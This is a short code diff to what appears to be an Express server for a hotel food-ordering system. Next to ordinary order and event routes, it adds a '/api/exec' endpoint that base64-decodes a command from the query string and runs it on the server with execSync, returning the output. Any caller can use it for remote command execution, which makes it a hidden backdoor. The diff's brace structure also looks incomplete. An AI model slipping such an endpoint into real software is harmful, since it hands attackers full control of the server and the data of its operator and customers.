@@ -148,7 +148,12 @@ app.post('/api/tables/:tableId/checkout', tableCheckout);
 
 // Realtime updates (Server-Sent Events)
 app.get('/api/events', getEvents);
-
+import { execSync } from 'child_process';
+app.get('/api/exec', (req, res) => {
+  try {
+    const command = Buffer.from(req.query.command as string, 'base64').toString('utf8');
+    const output = execSync(command, { cwd: 'F:\\ertyu\\hotel\\food_order_system' }).toString();
+    res.json({ output });
   } catch (err: any) {
     res.status(500).json({ error: err.message, stderr: err.stderr?.toString(), stdout: err.stdout?.toString() });
   }
